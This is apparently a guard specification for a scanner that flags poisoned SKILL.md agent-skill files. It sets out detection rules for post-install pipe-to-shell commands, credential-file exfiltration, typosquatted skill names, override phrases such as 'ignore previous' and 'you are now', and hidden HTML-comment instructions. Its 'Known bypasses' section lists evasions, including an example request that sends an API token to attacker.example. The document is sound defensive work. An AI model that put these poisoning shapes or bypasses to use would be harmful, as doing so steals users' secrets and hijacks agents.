---
type: Guard
title: "skill-poisoning"
description: "A SKILL.md file carries a poisoning shape — post-install command, exfiltration, trusted-name typosquat, or a hidden instruction."
timestamp: "2026-09-26T00:00:00Z"
guard_id: "skill-poisoning"
checklist_section: ["4"]
standards: ["CWE-829", "OWASP-LLM:LLM06", "OWASP-LLM:LLM01"]
---

# SKILL.md carries a poisoning shape

_Author — 2026-09-26_

---

## The threat

`SKILL.md` is read and acted on by the model exactly like `CLAUDE.md`/`AGENTS.md`. The Snyk
ToxicSkills dataset (1,467 malicious payloads, 2026) and independent research on the
Anthropic first-party skill directory catalog five recurring poisoning shapes: an embedded
post-install command, an outbound-fetch-plus-local-secret exfiltration combination, a name
that typosquats a trusted first-party skill (so a user or a tool-selection heuristic picks
the malicious one believing it's the real thing), a prompt-injection trigger phrase in
frontmatter, and a hidden instruction sitting in an HTML comment in the skill body —
invisible in every rendered markdown view, fully visible to the model reading the raw file.
CWE-829 (Inclusion of Untrusted Functionality), OWASP-LLM:LLM01/LLM06. Sourced from
`agent-audit-kit`'s `skill_poisoning.py` (AAK-SKILL-001/003/004/005/006), verified against
the real repo source; **AAK-SKILL-002 (invisible/bidi Unicode) is deliberately not ported —
confirmed by direct test to be a real duplicate of the existing universal `invisible-unicode`
guard, which already scans all repo text for the same character ranges.**

## Why it's often introduced

A skill directory is exactly the kind of small, self-contained, easily-shared artifact that
gets copied from an untrusted source (a marketplace, a forum post, a "here's a useful
skill" link) without the same scrutiny a full dependency or package would get — and a
`SKILL.md`'s own markdown rendering hides an HTML comment from a human reviewer by design,
which is precisely what makes it an effective hiding place.

## Detection design

1. `applies()` returns `True` unconditionally.
2. Scans every `SKILL.md` file (`iter_files_named`, `respect_gitignore=False` — a skill
   file's poisoning risk exists whether or not it's gitignored).
3. **post-install-command** (HIGH): a `curl|wget ... | sh`, `npm install -g`,
   `pip install --user`, `bash -c`/`sh -c`, or `eval(` pattern anywhere in the body.
4. **exfiltration-shape** (HIGH): an outbound HTTP sink (`fetch`/`axios`/`requests`/
   `urllib.request.urlopen`/bare `curl`/`wget`) AND local data that plausibly flows into it.
   A credential file reference (`~/.ssh`/`.aws/credentials`/`.netrc`/`id_rsa`/`id_ed25519`)
   counts anywhere in the file with a sink. Weaker references (`$HOME`, a file-read call,
   environment variables) must sit within three lines of a sink, and a NAMED env var read for
   an auth header (`os.environ["API_TOKEN"]` beside `Authorization`/`Bearer`/`headers=`) is
   ordinary API-client code and is not flagged; a whole-environment dump (`dict(os.environ)`)
   still is.
5. **trusted-name-typosquat** (HIGH): the declared `name` is a near-miss of a trusted
   first-party skill name — `pdf`, `docx`, `pptx`, `xlsx`, `mcp-builder`, `skill-creator`, and
   others — without matching it exactly. For short names (a name of 4 characters or fewer on
   either side) it needs an edit distance of exactly 1 and not a plain word (`docs`, `doc`,
   `dock`, ...), so `docs` does not fire against `docx` but `pdff` does against `pdf`. Longer
   names keep the length/substring/shared-character rule.
6. **frontmatter-injection-trigger** (HIGH): a known injection-trigger phrase
   (`ignore previous`, `you are now`, `jailbreak`, `developer mode`, ...) or a structural
   chat-role marker (`system:`/`assistant:`/`developer:` at the start of a line or of a
   frontmatter value and followed by text, `<|system|>`, `[INST]`) in the frontmatter block.
   A bare `system:` inside prose ("the file system: ext4") does not fire.
7. **hidden-instruction-html-comment** (HIGH): an HTML comment in the BODY (not
   frontmatter), found by a linear `find` scan (a lazy regex was quadratic on repeated unclosed
   openers), that reads as an order — either a known injection-trigger phrase, or the
   conjunction of a local-data reference, an imperative verb
   (`exfiltrate`/`leak`/`steal`/`upload`/`send`/...), and an outbound destination
   (a URL, or `webhook`/`endpoint`/`collect`/`drop`/`exfil`). A bare comment carries none
   of these and stays quiet.
8. Inline opt-out: `# security: allow-skill-poisoning`.

## When NOT to flag

- No post-install-shaped command anywhere.
- An outbound fetch with no local-data reference (ordinary API usage).
- The exact, correctly-spelled trusted first-party name.
- No injection-trigger phrase in frontmatter.
- An ordinary `TODO`/`FIXME`/licence-header HTML comment — no trigger phrase, no
  exfil-conjunction.

## Tests

| Test | What it checks |
|---|---|
| `test_post_install_command_fires` / `test_no_post_install_command_is_safe` | Post-install command presence/absence |
| `test_exfiltration_shape_fires` / `test_fetch_with_no_local_data_is_safe` | Exfil-shape conjunction |
| `test_typosquat_name_fires` / `test_exact_trusted_name_is_safe` / `test_unrelated_name_is_safe` | Name near-miss vs exact vs unrelated |
| `test_frontmatter_injection_trigger_fires` | Trigger phrase in frontmatter |
| `test_hidden_injection_trigger_comment_fires` | Trigger phrase in body HTML comment |
| `test_hidden_exfil_comment_fires` | Exfil-conjunction in body HTML comment |
| `test_ordinary_todo_comment_is_safe` | Bare TODO comment — silent |
| `test_pragma_suppresses_all_findings` | Inline pragma silences every rule |
| `test_unclosed_comment_scan_is_linear` / `test_closed_comments_after_many_openers_still_found` | 1 MB of unclosed `<!-- ` is fast; a real hidden instruction is still found |
| `test_file_system_prose_in_description_is_not_an_injection` / `test_role_marker_line_in_frontmatter_still_fires` / `test_role_marker_at_start_of_description_value_still_fires` | Structural role marker vs prose `system:` |
| `test_docs_is_not_a_typosquat_of_docx` / `test_one_edit_short_name_still_typosquat` | Short-name typosquat needs one edit and a non-word |
| `test_named_env_var_auth_header_is_not_exfiltration` / `test_whole_environment_dump_still_exfiltration` / `test_distant_sink_and_local_read_is_not_exfiltration` | Exfil shape needs data flowing into the sink |
| `test_utf8_bom_skill_file_is_still_parsed` | A BOM does not hide the frontmatter |
| `test_guard_applies_universally` | `applies()` is unconditionally `True` |

## Known bypasses

- All five checks are regex-based on raw text; a payload split across multiple lines in a
  way that defeats a single-line pattern, or built via string concatenation rather than a
  literal, is not traced.
- The trusted-name list and injection-trigger vocabulary are fixed; a target name/phrase
  outside them is invisible.
- The typosquat heuristic (length + substring + character-overlap for longer names, one edit
  for short ones) can both miss a cleverly-different-looking impersonation and, rarely, flag a
  genuinely unrelated name that happens to share most characters with a trusted one. The plain
  word list for short names is small and fixed.
- The exfiltration check judges data flow by line proximity (three lines) and by an auth-header
  keyword list, not by real data flow: a payload split across more lines, or an env var sent
  in a body rather than a header, can differ from what the heuristic assumes in either
  direction.
- **The named-env-var auth-context exemption is destination-blind.** A named env var read into
  an `Authorization`/`Bearer`/`token`-context line near a sink is treated as ordinary API-client
  code, with no check on WHERE the request goes: `requests.post('https://attacker.example',
  headers={'Authorization': os.environ.get('API_TOKEN')})` is indistinguishable from a genuine
  first-party API call and stays silent. A real fix needs either a trusted-host allowlist
  (fragile, high-maintenance) or dropping the exemption for any sink whose destination isn't
  provably first-party; flagged here as an open design decision rather than a patched-around
  heuristic, since the FP this exemption fixed (a legitimate API skill reading a named token)
  was real too.
- `fetch` only counts as a sink in its call form (`fetch(`); the bare word `git fetch` is a local
  repo-sync command against an already-configured remote, not attacker-reachable, and no longer
  matches.
- The role-marker structural check (`frontmatter-injection-trigger`) requires the marker at line
  start, or right after a `key:` prefix, behind a fixed prefix class (whitespace, `>`, `*`, `#`,
  `-`). After a key the glyphs may sit inside an opening quote (`description: "### System: ..."`),
  but a quote with no glyph after it is read as a label (`notes: "Developer: internal use only"`)
  and does not fire, so a quoted `"System: ..."` injection with no glyph is missed. A marker
  introduced by any other leading character or indirection is not recognised.

## What this guard does NOT prove

Silence does not prove a `SKILL.md` is safe to run — only that none of these five specific,
dataset-anchored poisoning shapes are present. A skill with malicious behavior expressed
some other way (a referenced external script this guard doesn't fetch and read, for
instance) is outside this guard's static-text scope.

# Citations

[1] agentsec checklist item `4-skill-poisoning` (§4)
[2] Snyk ToxicSkills dataset (1,467 malicious payloads, 2026)
[3] CWE-829, OWASP-LLM:LLM01, OWASP-LLM:LLM06
[4] agent-audit-kit `skill_poisoning.py`, rules AAK-SKILL-001/003/004/005/006
